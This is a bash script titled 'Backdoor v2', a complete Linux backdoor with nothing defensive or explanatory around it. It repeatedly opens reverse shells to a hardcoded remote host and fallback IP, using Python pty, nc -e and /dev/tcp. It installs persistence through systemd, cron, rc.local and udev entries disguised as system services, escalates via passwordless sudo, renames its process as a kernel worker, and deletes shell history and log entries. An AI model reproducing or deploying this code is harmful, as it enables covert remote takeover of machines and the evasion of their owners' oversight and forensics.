#!/bin/bash
# Backdoor v2 

# ==========================================
HOSTNAME_PRIMARY="eli2lite.net"   
FALLBACK_IP="153.75.83.39"          
PORT=443
SLEEP_MIN=5
SLEEP_MAX=300
PID_FILE="/tmp/.systemd-resolved.pid"
LOCK_FILE="/tmp/.systemd-resolved.lock"
SELF="$(readlink -f "$0")"

# ==========================================

single_instance() {
    exec 9>"$LOCK_FILE"
    if ! flock -n 9; then
        exit 0
    fi
}

# ==========================================

hide_me() {
    echo '[kworker/0:1]' > /proc/$$/comm 2>/dev/null

    if [ -w /proc/$$/cmdline ]; then
        printf 'kworker/0:1\0' > /proc/$$/cmdline 2>/dev/null
    fi
}

# ==========================================

clean_traces() {
    history -c 2>/dev/null
    cat /dev/null > ~/.bash_history 2>/dev/null

    sed -i "/$PORT/d" /var/log/auth.log 2>/dev/null
    sed -i "/$HOSTNAME_PRIMARY/d;/$FALLBACK_IP/d" /var/log/syslog 2>/dev/null
}

# ==========================================

install_persistence() {
    [ "$(id -u)" -ne 0 ] && return

    # 1) systemd
    cat > /etc/systemd/system/systemd-resolved-helper.service <<EOF
[Unit]
Description=Systemd Resolved Helper
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=/bin/bash $SELF --daemon
Restart=always
RestartSec=30
User=root
StandardOutput=null
StandardError=null
LimitNOFILE=65535

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload 2>/dev/null
    systemctl enable systemd-resolved-helper.service 2>/dev/null
    systemctl start  systemd-resolved-helper.service 2>/dev/null

    ( crontab -l 2>/dev/null | grep -vF "$SELF"; \
      echo "@reboot /bin/bash $SELF --daemon >/dev/null 2>&1" ) | crontab - 2>/dev/null


    if [ -f /etc/rc.local ]; then
        grep -qF "$SELF" /etc/rc.local || \
            sed -i "1i /bin/bash $SELF --daemon >/dev/null 2>&1 &" /etc/rc.local
        chmod +x /etc/rc.local 2>/dev/null
    fi

    cat > /etc/udev/rules.d/99-systemd-resolved.rules <<EOF
ACTION=="add", RUN+="/bin/bash $SELF --daemon"
EOF
    udevadm control --reload 2>/dev/null
}

# ==========================================

resolve_target() {

    if command -v nc &>/dev/null; then
        if nc -z -w3 "$HOSTNAME_PRIMARY" "$PORT" 2>/dev/null; then
            echo "$HOSTNAME_PRIMARY"; return 0
        fi
        if nc -z -w3 "$FALLBACK_IP" "$PORT" 2>/dev/null; then
            echo "$FALLBACK_IP"; return 0
        fi
        return 1
    fi

    for target in "$HOSTNAME_PRIMARY" "$FALLBACK_IP"; do
        if timeout 3 bash -c "echo >/dev/tcp/$target/$PORT" 2>/dev/null; then
            echo "$target"; return 0
        fi
    done
    return 1
}


connect_loop() {
    local sleep_time=$SLEEP_MIN
    while true; do
        target="$(resolve_target)" || {
            sleep "$sleep_time"
            sleep_time=$(( sleep_time * 2 ))
            [ "$sleep_time" -gt "$SLEEP_MAX" ] && sleep_time=$SLEEP_MAX
            continue
        }
        sleep_time=$SLEEP_MIN   

        if command -v python3 &>/dev/null; then
            python3 - "$target" "$PORT" <<'PY' 2>/dev/null
import socket, os, pty, sys, select, subprocess, time
host, port = sys.argv[1], int(sys.argv[2])
try:
    s = socket.create_connection((host, port), timeout=10)
except Exception:
    sys.exit(1)
s.setblocking(False)

master, slave = pty.openpty()
p = subprocess.Popen(['/bin/bash', '-i'], stdin=slave, stdout=slave, stderr=slave,
                     preexec_fn=os.setsid, close_fds=True)
os.close(slave)

while True:
    r, _, _ = select.select([s, master], [], [], 30)
    if s in r:
        try:
            data = s.recv(4096)
        except Exception:
            break
        if not data: break
        os.write(master, data)
    if master in r:
        try:
            data = os.read(master, 4096)
        except OSError:
            break
        if not data: break
        try: s.sendall(data)
        except Exception: break
try: p.kill()
except Exception: pass
sys.exit(1)
PY
        elif command -v nc &>/dev/null; then

            nc -e /bin/bash "$target" "$PORT" 2>/dev/null
        else

            bash -c "
                exec 3<>/dev/tcp/$target/$PORT || exit 1
                /bin/bash <&3 >&3 2>&3
                exec 3>&-
            " 2>/dev/null
        fi

        clean_traces

        jitter=$(( RANDOM % 10 ))
        sleep $(( SLEEP_MIN + jitter ))
    done
}

# ==========================================
# main
# ==========================================
main() {
    if [ "$(id -u)" -ne 0 ]; then
        if command -v sudo &>/dev/null && sudo -n true 2>/dev/null; then
            exec sudo -n /bin/bash "$SELF" "$@"
        fi
    fi

    single_instance

    if [ "$1" = "--daemon" ]; then
        hide_me
        install_persistence
        setsid /bin/bash "$SELF" --loop </dev/null >/dev/null 2>&1 &
        exit 0
    fi

    if [ "$1" = "--loop" ]; then
        hide_me
        connect_loop
        exit 0
    fi

    hide_me
    install_persistence
    setsid /bin/bash "$SELF" --loop </dev/null >/dev/null 2>&1 &
    exit 0
}

main "$@"
